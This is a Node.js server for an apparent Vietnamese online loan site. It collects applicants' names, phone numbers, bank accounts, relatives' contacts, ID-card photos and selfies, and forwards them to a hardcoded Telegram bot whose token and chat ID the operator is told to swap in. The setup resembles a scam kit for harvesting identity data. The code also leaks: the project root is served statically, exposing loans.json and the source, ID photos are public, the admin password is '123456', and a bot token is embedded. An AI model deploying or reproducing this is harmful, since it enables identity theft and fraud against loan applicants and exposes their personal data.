const express = require('express');
const multer = require('multer');
const path = require('path');
const cors = require('cors');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

// === THAY TOKEN VÀ CHAT ID CỦA BẠN ===
const TELEGRAM_BOT_TOKEN = '8999331195:AAFgHthGvHsksplYrygVPrRFPj3JY9ltHL4';
const TELEGRAM_CHAT_ID = '5990088732';
// Mật khẩu vào trang Quản trị viên
const ADMIN_PASSWORD = '123456'; 

// Cơ sở dữ liệu tạm thời (Lưu vào file JSON)
const DB_FILE = './loans.json';
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify([]));
}

function getLoans() {
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}
function saveLoans(loans) {
    fs.writeFileSync(DB_FILE, JSON.stringify(loans, null, 2));
}

if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads');
}

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

function sendTelegramMessage(text) {
    return new Promise((resolve) => {
        const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' });
        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        };
        const req = https.request(options, (res) => resolve());
        req.on('error', (e) => resolve());
        req.write(data);
        req.end();
    });
}

// 1. API Nộp hồ sơ
app.post('/api/submit-loan', upload.fields([
    { name: 'cccdFront', maxCount: 1 },
    { name: 'selfie', maxCount: 1 }
]), async (req, res) => {
    try {
        const { amount, days, fullName, phone, bankAccount, bankName, relativeRelation, relativeName, relativePhone } = req.body;
        const cccdFile = req.files && req.files['cccdFront'] ? req.files['cccdFront'][0].filename : '';
        const selfieFile = req.files && req.files['selfie'] ? req.files['selfie'][0].filename : '';
        const loanId = 'VAY' + Date.now().toString().slice(-6);

        const createdDate = new Date();
        const dueDate = new Date();
        dueDate.setDate(dueDate.getDate() + parseInt(days));

        const newLoan = {
            loanId,
            fullName: (fullName || '').toUpperCase(),
            phone,
            amount: parseInt(amount),
            days: parseInt(days),
            bankName,
            bankAccount,
            relativeRelation,
            relativeName,
            relativePhone,
            cccdFile,
            selfieFile,
            status: 'Đang chờ duyệt', // Mặc định
            createdAt: createdDate.toLocaleDateString('vi-VN'),
            dueDate: dueDate.toLocaleDateString('vi-VN')
        };

        const loans = getLoans();
        loans.unshift(newLoan);
        saveLoans(loans);

        const host = req.get('host');
        const baseUrl = `${req.protocol}://${host}`;

        const message = `
🔥 <b>HỒ SƠ VAY MỚI: #${loanId}</b>
----------------------------------
👤 <b>Khách hàng:</b> ${newLoan.fullName}
📞 <b>SĐT:</b> <code>${phone}</code>
💰 <b>Vay:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} đ (${days} ngày)
🏦 <b>Ngân hàng:</b> ${bankName} - STK: <code>${bankAccount}</code>
----------------------------------
👨‍👩‍👧 <b>Người thân (${relativeRelation}):</b> ${relativeName} (${relativePhone})
----------------------------------
🖼 <b>Ảnh CCCD:</b> ${baseUrl}/uploads/${cccdFile}
🤳 <b>Ảnh Selfie:</b> ${baseUrl}/uploads/${selfieFile}
        `;

        await sendTelegramMessage(message);
        res.json({ success: true, message: 'Thành công', loanId });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Lỗi server' });
    }
});

// 2. API Tra cứu trạng thái cho khách
app.get('/api/check-status', (req, res) => {
    const { query } = req.query; // Nhập SĐT hoặc Mã vay
    const loans = getLoans();
    const result = loans.filter(l => l.phone === query || l.loanId === query.toUpperCase());
    res.json({ success: true, data: result });
});

// 3. API Dành cho Quản trị viên (Admin)
app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, loans: getLoans() });
    } else {
        res.status(401).json({ success: false, message: 'Sai mật khẩu Admin!' });
    }
});

app.post('/api/admin/update-status', (req, res) => {
    const { password, loanId, status } = req.body;
    if (password !== ADMIN_PASSWORD) return res.status(401).json({ success: false });

    let loans = getLoans();
    const index = loans.findIndex(l => l.loanId === loanId);
    if (index !== -1) {
        loans[index].status = status;
        saveLoans(loans);
        res.json({ success: true });
    } else {
        res.json({ success: false, message: 'Không tìm thấy hồ sơ' });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
            
